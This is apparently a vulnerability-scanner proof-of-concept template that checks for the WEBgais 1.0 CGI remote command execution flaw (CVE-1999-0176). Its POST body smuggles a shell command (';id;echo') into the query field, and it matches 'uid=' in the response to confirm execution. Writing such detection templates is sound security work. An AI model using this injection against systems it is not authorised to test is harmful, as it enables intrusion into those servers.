[info]
author = "ave"
description = "检测 WEBgais 1.0 远程命令执行漏洞（CVE-1999-0176）。/cgi-bin/webgais CGI 脚本对 query 参数过滤不严，通过 POST 传入特制 payload 可执行任意系统命令"
id = "POC-AVE-1999-0351"
name = "WEBgais 1.0 Remote Command Execution PoC"
severity = "high"
tags = ["ave-1999-0351"]
vuln_id = [
    "CVE-1999-0176",
    "AVE-1999-0351",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/webgais"
protocol = "http"

[poc.requests.body]
content = "query=';id;echo'&output=subject&domain=paragraph"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
